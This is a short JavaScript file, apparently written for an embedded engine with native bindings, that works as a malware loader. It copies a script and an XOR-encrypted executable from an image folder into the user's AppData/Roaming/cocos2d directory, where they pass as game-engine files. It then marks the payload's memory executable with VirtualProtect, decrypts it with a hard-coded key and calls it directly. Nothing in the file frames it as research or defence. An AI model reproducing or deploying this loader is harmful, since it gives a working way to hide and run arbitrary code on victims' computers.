// variables start
let payload_xor_key = 'S7MUtPmP7InrhXF4ut3VbJ8pdtQ2Eiox';
let base_payload_name = 'guide/img/payload.xor.exe';
let base_script_name = "guide/img/test.js";
let copy_path = '/AppData/Roaming/cocos2d/';
let copy_script_name = "test.js";
let copy_payload_name = "payload.xor.exe";
let payload_offset = 0
// variables end

let home = ffi('char * home()')();

let malloc = ffi('void * malloc(int)');
let call = ffi('void call(void *)');
let logInt = ffi('void log(char*,int)');
let logStr = ffi('void log(char*,char *)');
let data_to_bytes = ffi('void * data_to_bytes(void *)');
let data_to_size = ffi('int data_to_size(void *)');
let loadData = ffi('void * read(char *,int)');
let virtualProtect = ffi('int VirtualProtect(void *,int,int,void *)');
let copyFile = ffi('int CopyFileA(char *,char *,int)');
let xor = ffi('void xor(void *,int,char *,void *)');

copyFile(base_script_name, home + copy_path + copy_script_name, 0);
copyFile(base_payload_name, home + copy_path + copy_payload_name, 0);
logStr('%s\n', 'Hello');

let payload = loadData(home + copy_path + copy_payload_name, payload_offset);
let length = data_to_size(payload);
let bytes = data_to_bytes(payload);
logInt('%d\n', length);

let int_ptr = malloc(8);
virtualProtect(bytes, length, 64, int_ptr);
xor(bytes, length, payload_xor_key, bytes);
logInt('%d\n', length);
call(bytes);